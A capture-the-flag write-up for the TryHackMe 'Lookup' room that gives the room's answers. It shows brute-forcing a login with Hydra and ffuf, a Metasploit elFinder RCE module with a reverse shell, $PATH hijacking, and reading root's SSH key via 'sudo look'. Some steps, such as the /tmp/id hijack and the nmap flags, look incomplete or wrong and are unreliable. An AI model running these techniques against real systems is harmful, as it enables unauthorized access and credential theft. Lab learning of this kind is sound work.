# Lookup | TryHackMe

## Overview
- **Room:** Lookup  
- **Difficulty:** easy  
- **Tags:** Web, Fuzzing, Hydra, PrivEsc  

---

## Enumeration

### Nmap
```bash
nmap -sC -sV -oN <IP>
```

**Open Ports:**
- 22/tcp - SSH  
- 80/tcp - HTTP  

---

### Web Enumeration
Visited `http://<IP>/` → login page.  

Tested `admin:admin` → username valid, password invalid.  

---

### Brute-force
Used Hydra for password guessing:  
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"
```
No success.  

Then fuzzed for other usernames with ffuf:  
```bash
ffuf -u http://<IP>/login -d "username=FUZZ&password=test" -X POST -w /usr/share/wordlists/common.txt -fr "Invalid username"
```
Discovered user: **jose**  

Brute-forced again with Hydra:  
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"
```
Success: `jose : password123`  

---

## Exploitation

Logged in as jose.  

Discovered subdomain `files.lookup.thm`. Added to `/etc/hosts`.  

Accessed `http://files.lookup.thm/` → running **elFinder** file manager.  

Identified version vulnerable to RCE. Used Metasploit:  
```bash
msfconsole
search elfinder
use exploit/multi/http/elfinder_php_connector_exec
set RHOSTS files.lookup.thm
set RPORT 80
set TARGETURI /
set LHOST <your_IP>
run
```
Got shell as `www-data`.  

---

## Privilege Escalation

Ran `linpeas.sh` → found process `pwn` running as root.  

Binary reads `$PATH`. Exploit with fake `id`:  
```bash
echo "id_think" > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```
Now `pwn` executes `/tmp/id` → shell as **think**.  

---

### From think to root
Checked sudo:  
```bash
sudo -l
```
Allowed to run `look`. Checked GTFOBins → `look` can read files.  

```bash
sudo look '' /root/.ssh/id_rsa
```
Extracted root’s private key, logged in as root.  

---

## Flags
- **User.txt** → `/home/think/user.txt`  
- **Root.txt** → `/root/root.txt`  

---

## Answers to Room Questions
1. **What valid username was discovered?** → `jose`  
2. **What was jose’s password?** → `password123`  
3. **Which vulnerable app was running on the subdomain?** → `elFinder`  
4. **What binary was abused for privilege escalation?** → `pwn`  
5. **What command allowed root private key extraction?** → `sudo look`  

---

## Lessons Learned
- Username fuzzing can reveal hidden accounts.  
- Subdomain discovery is key to hidden services.  
- `$PATH` hijacking remains a powerful PrivEsc method.  
- GTFOBins is invaluable for exploiting sudo misconfigs.  
